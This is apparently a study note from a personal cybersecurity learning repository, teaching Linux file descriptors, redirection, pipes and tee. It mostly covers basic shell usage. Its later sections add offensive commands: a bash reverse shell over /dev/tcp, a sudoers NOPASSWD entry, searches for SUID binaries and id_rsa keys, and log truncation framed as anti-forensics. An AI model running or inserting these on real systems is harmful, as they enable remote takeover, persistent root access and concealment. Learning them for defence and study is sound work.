<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 05 — Linux I/O Redirection, File Descriptors & Piping Architecture
   ========================================================================= -->

# 🛡️ Day 05: Linux I/O Redirection, File Descriptors & Piping

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Standard Streams, Data Flow Control & Process Inter-Communication*

---

## 1. POSIX Standard Streams & File Descriptors

In Linux, the kernel treats all I/O devices, open files, network sockets, and pipes as streams of bytes. When a process initializes, the kernel automatically opens **three standard data streams**, each bound to a non-negative integer known as a **File Descriptor (FD)**.

```
                    ┌──────────────────────────────┐
                    │       LINUX PROCESS          │
  [ Keyboard ] ───> │ FD 0: Standard Input  (stdin)│
                    │                              │
                    │ FD 1: Standard Output (stdout)│ ───> [ Terminal Display ]
                    │ FD 2: Standard Error  (stderr)│ ───> [ Terminal Display / Log ]
                    └──────────────────────────────┘
```

### Standard Stream Specification

| File Descriptor | Stream Name | Default Source / Target | Direct Device Node |
| :---: | :--- | :--- | :--- |
| **`0`** | `stdin` (Standard Input) | Keyboard input stream | `/dev/stdin` → `/proc/self/fd/0` |
| **`1`** | `stdout` (Standard Output) | Terminal screen buffer | `/dev/stdout` → `/proc/self/fd/1` |
| **`2`** | `stderr` (Standard Error) | Terminal screen buffer | `/dev/stderr` → `/proc/self/fd/2` |

---

## 2. Output Redirection (`stdout` & `stderr`)

Output redirection re-routes data streams away from default terminal display into persistent files, hardware devices, or discard sinks.

```
[ Command ] ───( stdout: FD 1 )───> [ file.txt (Overwritten: > ) ]
[ Command ] ───( stdout: FD 1 )───> [ file.txt (Appended:    >> ) ]
[ Command ] ───( stderr: FD 2 )───> [ error.log ]
```

### 1. `stdout` Redirection (`>` and `>>`)
* `command > file.txt` — Redirect `stdout` (FD 1) to file (overwrites existing file or creates new).
* `command >> file.txt` — Redirect `stdout` to file in **append mode** (preserves existing data).
* `> file.txt` — Instant zero-byte file truncation (instantly clears file content without deleting it).

### 2. `stderr` Redirection (`2>` and `2>>`)
* `command 2> error.log` — Redirect errors (FD 2) to a log file; normal output still prints to terminal.
* `command 2>> error.log` — Append error messages to log file.

### 3. Merging `stdout` and `stderr`
* `command > output.log 2>&1` — Redirect FD 1 to file, then duplicate FD 2 to point to FD 1's destination.
* `command &> output.log` — Modern Bash shorthand to redirect both `stdout` and `stderr` to a single file.
* `command &>> output.log` — Append both `stdout` and `stderr` to a single file.

### 4. Bit Bucket Silencing (`/dev/null`)
* `command 2> /dev/null` — Suppress all error messages (stealthy scanning & clean output parsing).
* `command &> /dev/null` — Execute command in complete silence (suppresses both output and errors).

---

## 3. Input Redirection & Heredocs (`stdin`)

Input redirection feeds external data streams into commands that default to keyboard entry.

### 1. File Input Redirection (`<`)
* `wc -l < target.txt` — Feed `target.txt` directly to `stdin` of `wc` (displays only the line count without printing the filename).

### 2. Here-Document (`<<`)
Passes a multi-line block of text directly into an interactive command/script until a specific delimiter token is met.

```bash
cat << EOF > configuration.conf
[SERVER_CONFIG]
HOST=127.0.0.1
PORT=8080
SSL=TRUE
EOF
```
* `cat <<- EOF` — Leading tabs in the text block are stripped automatically.

### 3. Here-String (`<<<`)
Passes a single inline string directly into a command's standard input.

* `base64 -d <<< "SVdfQ3liZXJfT3Bz"` — Decode string directly without using `echo` and pipes.

---

## 4. Pipeline Architecture & `tee`

Pipes (`|`) establish **Inter-Process Communication (IPC)** in kernel memory. The `stdout` of the sending process is directly wired into the `stdin` of the receiving process without writing intermediate data to the physical disk.

```
┌───────────┐                 ┌─────────────┐                 ┌───────────┐
│ Command A │ ──( stdout )──> │  PIPE ( | ) │ ──( stdin )───> │ Command B │
└───────────┘                 └─────────────┘                 └───────────┘
```

### Practical Pipeline Examples
* `ps aux | grep "sshd"` — Search for specific processes directly from memory snapshot.
* `cat /etc/passwd | wc -l` — Count registered system accounts.
* `find / -perm -4000 2>/dev/null | grep -E "(bin|sbin)"` — Find SUID binaries and filter by path.

---

### The `tee` T-Junction Utility
Duplicates the data stream: writes standard input to **both** standard output (screen) and one or more files simultaneously.

```
                           ┌──> [ file.log ]
───( Pipe Data )───> [ tee ]
                           └──> [ stdout (Screen) ]
```

* `command | tee output.log` — Print output to terminal and write to `output.log`.
* `command | tee -a output.log` — Append output to file and print to terminal (`-a` = append).
* `echo "admin ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/admin` — Write to root-owned files with sudo privileges (standard `>` redirection fails under `sudo` because the redirection is parsed by the non-privileged shell).

---

## 5. Advanced File Descriptors & Sockets

Linux allows creating custom file descriptors (FD `3` to `9`) for custom stream manipulation.

* `exec 3> custom.log` — Open FD 3 for writing to `custom.log`.
* `echo "Log Event" >&3` — Write string directly into custom FD 3.
* `exec 3>&-` — Close custom File Descriptor 3.

> 🔴 **Cyber Ops Context: Bash Reverse Shell Redirection**  
> ```bash
> bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
> ```
> * `bash -i` — Spawns an interactive shell.
> * `>& /dev/tcp/...` — Redirects `stdout` and `stderr` over a raw TCP socket connection.
> * `0>&1` — Takes `stdin` (FD 0) and points it to `stdout` (FD 1), giving remote attacker bidirectional control.

---

## 6. Security Operations Quick Matrix

| Operation | Command Syntax | Tactical Focus |
| :--- | :--- | :--- |
| **Silent Port / File Scan** | `find / -name "id_rsa" 2>/dev/null` | Hides `Permission Denied` noise during recon. |
| **Audit Log Interception** | `command 2>&1 \| tee run.log` | Captures both errors and successes for audit trails. |
| **Privileged File Injection**| `echo "nameserver 1.1.1.1" \| sudo tee -a /etc/resolv.conf` | Safely appends configuration via sudo. |
| **Inline String Decoding** | `openssl enc -d -base64 <<< "data"` | In-memory stream processing without disk writes. |
| **Instant Wipe / Anti-Forensics** | `> /var/log/target_audit.log` | Truncates log file size to 0 bytes instantly. |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
